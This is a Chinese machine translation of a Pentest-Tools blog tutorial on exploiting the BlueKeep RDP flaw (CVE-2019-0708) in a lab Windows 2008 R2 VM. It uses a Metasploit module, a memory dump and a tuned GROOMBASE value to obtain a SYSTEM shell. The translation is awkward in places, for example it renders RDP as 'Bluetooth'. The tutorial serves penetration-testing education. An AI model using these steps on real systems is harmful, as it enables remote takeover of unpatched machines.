<html>
<head>
<title>How to Exploit the BlueKeep Vulnerability with Metasploit | Pentest-Tools.com</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1>如何利用 Metasploit | Pentest-Tools.com 的 BlueKeep 漏洞</h1>
<blockquote>原文：<a href="https://pentest-tools.com/blog/bluekeep-exploit-metasploit#2023-02-21T15:41:15.000Z">https://pentest-tools.com/blog/bluekeep-exploit-metasploit#2023-02-21T15:41:15.000Z</a></blockquote><div><div class="prose prose-headings:break-words prose-img:rounded-md prose-img:ring-1 prose-img:ring-dark-blue-200 prose-img:ring-opacity-30 prose-code:break-words prose-headings:[scroll-margin-top:120px] xl:prose-lg xl:prose-headings:w-[628px] xl:prose-p:w-[628px]">
            
              
                
                  <p>在本文中，我们展示了我们利用最近提出的<a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/rapid7/metasploit-framework/pull/12283"> Metasploit 模块</a>来利用<a target="_blank" rel="noopener noreferrer" href="https://pentest-tools.com/blog/microsoft-rdp-vulnerability"> RDP 蓝牙漏洞</a>的方法。</p><p>我们展示了如何通过调整 Metasploit 模块代码(GROOMBASE 和 GROOMSIZE 值)在易受攻击的 Windows 2008 R2 计算机上获取 Meterpreter 外壳，因为<strong>该漏洞目前不能开箱即用</strong>。</p><p>接下来，我们将解释让模块在我们的目标机器上正常工作的步骤:</p><ol start="1"><li><p><a href="#1-background"> <strong>背景</strong> </a></p></li><li><p><a href="#2-prerequisites"> <strong>先决条件</strong> </a></p></li><li><p><a href="#3-installing-the-bluekeep-exploit-module-in-metasploit"> <strong>在 Metasploit </strong>中安装 Bluekeep 漏洞利用模块</a></p></li><li><p><a href="#4-setting-up-the-target-machine"> <strong>准备目标机</strong> </a></p></li><li><p><a href="#5-adjusting-the-bluekeep-exploit-groombase"> <strong>调整蓝调漏洞利用</strong> </a></p></li><li><p><a href="#6-running-the-bluekeep-exploit-module"> <strong>运行漏洞利用模块</strong> </a></p></li><li><p><a href="#7-conclusions"> <strong>结论</strong> </a></p></li></ol><h2 id="1-background"><strong> 1。背景</strong></h2><p>BlueKeep 是微软 RDP 服务中的一个严重的远程代码执行漏洞。由于该漏洞可以被蠕虫攻击，它已经引起了安全社区的极大关注，与<a target="_blank" rel="external nofollow noopener noreferrer" href="https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010">永恒之蓝 MS17-010 </a>和<a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.sans.org/security-resources/malwarefaq/conficker-worm"> Conficker MS08-067 </a>属于同一类别。我们发布了<a target="_blank" rel="noopener noreferrer" href="https://pentest-tools.com/blog/microsoft-rdp-vulnerability">对 BlueKeep 漏洞</a>的深入分析，以帮助你了解全貌。</p><p>几天前，一位 Metasploit 贡献者——<a target="_blank" rel="external nofollow noopener noreferrer" href="https://twitter.com/zerosum0x0">zero sum 0x 0</a>——向包含 BlueKeep(CVE-2019-0708)漏洞利用模块的框架提交了一个<a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/rapid7/metasploit-framework/pull/12283"> pull 请求</a>。Rapid7 团队也在他们的博客上发表了一篇关于这个漏洞的文章。</p><p>截至目前，该模块尚未集成到主 Metasploit 分支中(它仍然是一个拉请求)，它只针对 64 位版本的 Windows 2008 R2 和 Windows 7 SP1。此外，该模块现在被列为<strong>手动</strong>，因为用户需要提供关于目标的额外信息，否则，它有与 BSOD 崩溃的风险。</p><h2 id="2-prerequisites"><strong> 2。先决条件</strong></h2><p>为了让这个场景工作，我们使用了以下内容:</p><ul><li><p><strong> VirtualBox 6 </strong>用于托管目标 Windows 虚拟机</p></li><li><p>过时的 Windows 2008 R2 64 位。iso 图像；我们的目标虚拟机上安装的最新修补程序是:KB2888049 和 KB976902</p></li><li><p>一台<strong> Linux 机器</strong>在哪里安装 Metasploit(可以是虚拟机或物理机)</p></li></ul><p>在 Linux 机器上，首先，我们需要克隆 Metasploit 项目:</p><div class="content-highlight"><pre class="code-block"><code>$ git clone https://github.com/rapid7/metasploit-framework.git
$ cd metasploit-framework</code></pre></div><p>然后我们需要获得上面提到的带有拉请求的分支:</p><div class="content-highlight"><pre class="code-block"><code>$ git fetch origin pull/12283/head:bluekeep
$ git checkout bluekeep</code></pre></div><p>之后，我们安装 Metasploit 所需的依赖项:</p><div class="content-highlight"><pre class="code-block"><code>$ gem install bundler &amp;&amp; bundle</code></pre></div><p>在此步骤中，您可能会遇到类似这样的错误:<code>An error occurred while installing pg (0.21.0), and Bundler cannot continue. Make sure that gem install pg -v '0.21.0' --source 'https://rubygems.org/' succeeds before Bundling.</code></p><p>要修复它，您需要安装 PostgreSQL 的开发库:</p><div class="content-highlight"><pre class="code-block"><code>apt-get install libpq-dev</code></pre></div><p>我们遇到的另一个错误是:<code>An error occurred while installing pcaprub (0.13.0), and Bundler cannot continue. Make sure that gem install pcaprub -v '0.13.0' --source 'https://rubygems.org/' succeeds before bundling.</code></p><p>我们用以下方法解决了这个问题:</p><div class="content-highlight"><pre class="code-block"><code>apt-get install libpcap-dev</code></pre></div><p>此时，Metasploit 依赖项已正确安装，我们能够使用 BlueKeep 漏洞利用模块:</p><div class="content-highlight"><pre class="code-block"><code>$ ./msfconsole
msf5 &gt; use exploit/windows/rdp/cve_2019_0708_bluekeep_rce</code></pre></div><h2 id="4-setting-up-the-target-machine"><strong> 4。设置目标机器</strong></h2><p>我们的目标是安装在 Virtual Box 6 上的过时的 Windows 2008 R2 64 位机器。</p><p>下面是它的<code>systeminfo</code>输出:</p><p><img src="../Images/b12ba7f72e37b635ef88155a8a5ded19.png" alt="setting up the target machine for exploitation" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvYmx1ZWtlZXAtZXhwbG9pdC1tZXRhc3Bsb2l0L2luc3RhbGxpbmctdmlydHVhbC1tYWNoaW5lLnBuZw==?s=99af5cad3f8112084ef5366389d08fae"/></p><p>目标虚拟机具有以下属性:</p><ul><li><p>2GB 内存</p></li><li><p>1 核处理器</p></li><li><p>30 GB 硬盘存储容量</p></li></ul><p>正如漏洞注释中所述，对于 Windows Server 2008，我们必须将以下注册表项<code>HKLM\\SYSTEM\\CurrentControlSet\\ Control\\TerminalServer\\ WinStations\\RDP-Tcp\\fDisableCam</code>设置为<code>0</code>。这不是该目标操作系统的默认设置，但它是<a target="_blank" rel="external nofollow noopener noreferrer" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/fbb88576-40fc-4b20-a39b-042e75cb6f85"> RDPSND 通道</a>工作所必需的:</p><p><img src="../Images/4a846559ee6557c2fe5d279aa7ec801a.png" alt="registry editing" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvYmx1ZWtlZXAtZXhwbG9pdC1tZXRhc3Bsb2l0L3JlZ2lzdHJ5LWVkaXRvci5wbmc=?s=5279592e1783a54ffba2a2beb8fb5d89"/></p><p>这个漏洞不是开箱即用的。我们获得了几个 BSODs，但没有一个壳。</p><p><img src="../Images/18b06ef0db1e33b05ed6555ff8ae906d.png" alt="a blue screen of death error" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvYmx1ZWtlZXAtZXhwbG9pdC1tZXRhc3Bsb2l0L2JsdWUtc2NyZWVuLWVycm9yLnBuZw==?s=2344543a7e4b91022a9f1b61d6ea6819"/></p><h2 id="5-adjusting-the-bluekeep-exploit-groombase"><strong> 5。调整 BlueKeep 漏洞利用(GROOMBASE) </strong></h2><p>蓝屏文字表示我们有一个页面错误问题，这意味着一些内存地址没有正确设置。</p><p>我们真正需要的是正确的 GROOMBASE 值，它是<a target="_blank" rel="external nofollow noopener noreferrer" href="https://docs.microsoft.com/en-us/windows/win32/memory/memory-pools">非分页池区域</a> (NPP)的起始地址。</p><p>我们需要从目标机器的内存转储中提取 NPP 地址。</p><h3 id="getting-the-memory-dump-of-the-target-machine"><strong>获取目标机器的内存转储</strong></h3><p>这个操作用 VirtualBox 就可以轻松完成。目标机器需要在 VirtualBox 中启动，并且您需要运行以下命令(在您的 Windows 主机上)来获得内存转储:</p><div class="content-highlight"><pre class="code-block"><code>cmd&gt; C:\Program Files\Oracle\VirtualBox\VBoxManage.exe debugvm "vm_name" dumpvmcore --filename=vm.memdump</code></pre></div><p>如果您在 Linux 主机上使用 VirtualBox，也可以使用以下命令:</p><div class="content-highlight"><pre class="code-block"><code>$ VBoxManage debugvm &lt;uuid|vmname&gt; dumpvmcore [--filename=name]</code></pre></div><p><em>注意:</em>免费的 VMWare Workstation Player 15 版本不允许内存转储，因此我们建议使用 VirtualBox。</p><p>我们在 Docker 容器中使用<a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/google/rekall">recall</a>来完成这个操作。下面是我们如何在主机上下载带有 rekall 的 Docker 映像:</p><div class="content-highlight"><pre class="code-block"><code>$ docker pull remnux/rekall</code></pre></div><p>现在，我们将内存转储复制到我们的主目录中，我们需要使它可以从 docker 容器中访问。为此，您需要使用以下命令运行 docker 容器:</p><div class="content-highlight"><pre class="code-block"><code>$ cp dump_location/vm.memdump ~/bluekeep
$ docker run --rm -it -v ~/bluekeep:/home/nonroot/files remnux/rekall bash</code></pre></div><p>现在，通过键入以下命令运行 rekall:</p><div class="content-highlight"><pre class="code-block"><code>$ rekall -f files/dump_blue.memdump pools</code></pre></div><p>输出应该是这样的:</p><p><img src="../Images/019c94d0f91fe14e97080a513fc79da2.png" alt="the NPP output" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvYmx1ZWtlZXAtZXhwbG9pdC1tZXRhc3Bsb2l0L25wcC1vdXRwdXQucG5n?s=12509eaea3dac82e68bc02ff652ad9ae"/></p><p>这显示了 NPP 在您的虚拟机上的起始地址，该地址将被放置在漏洞的 GROOMBASE 变量中。</p><h3 id="editing-the-exploit-module"><strong>编辑漏洞利用模块</strong></h3><p>利用漏洞的代码位于<code>modules/exploits/windows/rdp/ cve20190708bluekeeprce.rb</code>中，您需要在“Virtualbox 6”部分下设置 GROOMBASE 变量，用提取的 NPP 开始地址替换它。在我们的例子中，它是:<code>0xfa8001804000</code>。</p><p><img src="../Images/8545e2d2815fdb17c1ea050dd9776c65.png" alt="editing the GROOMBASE variable" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvYmx1ZWtlZXAtZXhwbG9pdC1tZXRhc3Bsb2l0L2dyb29tYmFzZS12YXJpYWJsZS5wbmc=?s=76603ba48e5c7e126050ac5402dc7074"/></p><p>现在您需要使用命令<em>重新加载</em>Metasploit 模块:</p><h2 id="6-running-the-bluekeep-exploit-module"><strong> 6。运行 BlueKeep 漏洞利用模块</strong></h2><p>现在我们可以从 Metasploit 接口开始配置模块。</p><p>第一件事是将参数 GROOMSIZE 更改为 50。这与虚拟机拥有的内存量有关，这是适合我们情况的值。</p><p>其余参数是标准的(<code>RHOSTS</code>、<code>PAYLOAD</code>、<code>LHOST</code>)，您可以在下图中看到它们的配置:</p><p><img src="../Images/399190bbfa53a1ae9beafe80605b45dc.png" alt="configuring parameters for exploitation" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvYmx1ZWtlZXAtZXhwbG9pdC1tZXRhc3Bsb2l0L3BhcmFtZXRlcnMtY29uZmlndXJhdGlvbi5wbmc=?s=6e53de01e946841230c144dea38a29f3"/></p><p><em>注意:</em>以 RDP_*开头的参数不需要配置。它们不会影响漏洞利用的功能。</p><p>我们还做了<code>set target 2</code>在 VirtualBox 上选择目标，然后运行<code>check</code>命令，然后再运行<code>exploit</code>:</p><p><img src="../Images/515b8e448a908f46be33e7215b2c1426.png" alt="setting targets for exploitation" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvYmx1ZWtlZXAtZXhwbG9pdC1tZXRhc3Bsb2l0L3RhcmdldHMtc2V0LnBuZw==?s=dcaa9c710b295955007da3e230488eac"/></p><p>如您所见，该漏洞使攻击者能够以用户<strong> NT AUTHORITY/SYSTEM </strong>的身份远程执行代码，该用户是在 Windows 机器上拥有最高级别权限的本地系统帐户。</p><h2 id="7-conclusions"><strong> 7。结论</strong></h2><p>尽管为 BlueKeep 提出的 Metasploit 模块没有为您提供具有默认配置的远程 shell，但它对 Metasploit 的添加促使系统管理员和家庭用户修补他们的 Windows 机器。</p><p>我们相信，安全社区将很快发现一种自动检测 NPP 起始地址的方法，这将使这种利用在多个目标上完全可靠。</p><h4><strong>参考文献</strong></h4><p/>

                

                
              
            
          </div>
        </div>    
</body>
</html>